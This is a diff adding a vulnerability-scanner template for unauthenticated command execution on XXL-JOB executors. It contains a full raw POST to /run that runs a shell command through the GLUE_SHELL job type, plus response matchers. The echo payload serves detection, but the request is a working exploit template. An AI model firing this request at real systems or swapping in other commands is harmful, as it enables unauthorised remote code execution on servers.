@@ -1,0 +1,37 @@
+id: local-xxljob-unacc-executor-rce
+
+info:
+  name: XXL-JOB Executor Unauthorized Shell Command Execution
+  author: pentest-platform
+  severity: critical
+  description: |
+    XXL-JOB executor 2.2.0 and earlier has no authentication on the /run API
+    endpoint. An unauthenticated attacker can execute arbitrary OS commands via
+    GLUE_SHELL job type. The executor is typically exposed on port 9999.
+    Detection (safe-poc): POST to /run with glueType=GLUE_SHELL and
+    glueSource="echo xxl-rce-confirmed" — a vulnerable executor responds with
+    {"code":200} confirming command execution without requiring OOB callback.
+  reference:
+    - https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g
+    - https://landgrey.me/blog/18/
+  tags: safe-poc,xxl-job,java,cve,rce,unauth
+
+http:
+  - raw:
+      - |
+        POST /run HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"jobId":1,"executorHandler":"demoJobHandler","executorParams":"","executorBlockStrategy":"COVER_EARLY","executorTimeout":0,"logId":1,"logDateTime":1586629003729,"glueType":"GLUE_SHELL","glueSource":"echo xxl-rce-confirmed","glueUpdatetime":1586699003758,"broadcastIndex":0,"broadcastTotal":0}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":200'
+
+      - type: status
+        status:
+          - 200
